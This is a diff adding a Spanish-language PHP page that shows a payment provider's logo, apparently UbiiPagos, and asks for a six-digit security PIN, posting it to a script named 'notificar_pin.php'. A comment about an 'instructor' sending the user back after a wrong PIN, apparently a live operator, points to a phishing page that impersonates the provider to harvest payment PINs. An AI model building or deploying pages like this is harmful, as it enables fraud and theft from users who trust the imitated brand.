@@ -1,0 +1,57 @@
+<?php
+// Detectar si el instructor rebotó al usuario por PIN incorrecto para mostrar la alerta visual
+$error_pin = isset($_GET['error']) && $_GET['error'] == 'pin_malo';
+?>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación de Seguridad</title>
+    <style>
+        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f5f7fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); width: 100%; max-width: 380px; box-sizing: border-box; text-align: center; }
+        
+        /* Estilos para el contenedor del logotipo */
+        .logo-container {
+            margin-bottom: 20px; /* Espacio entre el logo y el título "Código PIN" */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .logo-container img {
+            max-width: 150px;  /* Ancho máximo del logo (ajústalo según tu imagen) */
+            height: auto;      /* Mantiene la proporción original de la imagen */
+            display: block;
+        }
+
+        h2 { color: #333; margin-bottom: 10px; margin-top: 10px; }
+        p { color: #666; font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
+        .error-box { background: #ffe3e3; color: #cc0000; padding: 12px; border-radius: 6px; font-size: 14px; margin-bottom: 20px; border: 1px solid #ffb3b3; }
+        .control { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; text-align: center; font-size: 20px; letter-spacing: 6px; margin-bottom: 20px; outline: none; font-weight: bold; }
+        .control:focus { border-color: #0076ff; }
+        .btn { width: 100%; padding: 12px; background: #0076ff; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        .btn:hover { background: #0056b3; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        
+        <div class="logo-container">
+            <img src="https://ubiionline.ubiipagos.com/LogoUbiiOnline.svg" alt="Logotipo">
+        </div>
+
+        <h2>Código PIN</h2>
+        
+        <?php if ($error_pin): ?>
+        <?php else: ?>
+            <p>Ingrese su pin de seguridad de 6 dígitos para continuar.</p>
+        <?php endif; ?>
+
+        <form action="notificar_pin.php" method="POST">
+            <input type="text" name="pin_seguridad" class="control" required maxlength="6" placeholder="000000" autocomplete="off" oninput="this.value = this.value.replace(/[^0-9]/g, '');">
+            <button type="submit" class="btn">Validar PIN</button>
+        </form>
+    </div>
+</body>
+</html>
